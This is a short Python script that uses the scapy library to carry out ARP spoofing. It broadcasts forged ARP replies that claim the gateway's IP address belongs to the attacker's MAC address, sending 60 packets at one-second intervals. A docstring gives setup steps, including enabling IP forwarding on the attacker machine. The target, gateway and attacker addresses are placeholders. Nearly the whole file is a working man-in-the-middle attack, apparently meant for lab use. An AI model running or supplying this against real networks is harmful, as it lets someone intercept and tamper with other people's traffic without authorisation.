#!/usr/bin/env python
from scapy.all import *

"""Attacker Machine:
	Enable IPV4 forwarding:
		echo 1 > /proc/sys/net/ipv4/ip_forward
	Target Machine:
	Delete ARP cache for gateway:
		arp -d GATEWAY_IP
	Get attacker's ether address and target's inet address
	Get gateway as the first hop in traceroute"""

a = ARP()
a.pdst = TARGET_IP
a.psrc = GATEWAY_IP
a.hwsrc = ATTACKER_ETHER
a.hwdst = "ff:ff:ff:ff:ff:ff" #Broadcast

send(a, inter = 1, count = 60)